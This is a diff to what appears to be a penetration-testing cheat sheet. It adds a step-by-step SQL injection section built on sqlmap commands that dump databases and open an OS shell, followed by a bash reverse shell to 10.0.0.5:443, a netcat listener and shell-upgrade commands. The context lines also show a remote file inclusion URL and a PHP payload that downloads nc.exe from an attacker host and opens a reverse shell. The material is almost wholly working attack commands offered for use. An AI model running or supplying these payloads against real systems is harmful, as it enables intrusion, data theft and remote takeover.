@@ -205,6 +205,31 @@ http://target.com/test.php?page=http://<attacker IP>/test.txt
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# SQL Injection
+
+Use Burp, turn the Proxy intercept on.
+Send a form request with no data using the browser.
+Capture the request, right-click on the POST > Copy to file: login.txt
+
+sqlmap.py -r login.txt --force-ssl --batch
+sqlmap.py -r login.txt --force-ssl --batch --dbs
+sqlmap.py -r login.txt --force-ssl --batch -D <database> --tables
+sqlmap.py -r login.txt --force-ssl --batch -D <database> -T <table> --dump
+sqlmap.py -r login.txt --force-ssl --batch --os-cmd whoami
+sqlmap.py -r login.txt --force-ssl --batch --os-cmd id
+sqlmap.py -r login.txt --force-ssl --batch --os-shell
+
+os-shell> bash -c "bash -i >& /dev/tcp/10.0.0.5/443 0>&1"
+
+kali:
+nc -lvpn 443
+python3 -V
+python3 -c 'import pty;pty.spawn("bash")'
+ctrl Z
+stty raw -echo; fg
+cd ~
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # URL Encoding
 
 Reserved characters     @ $ & + = ; : , / ?
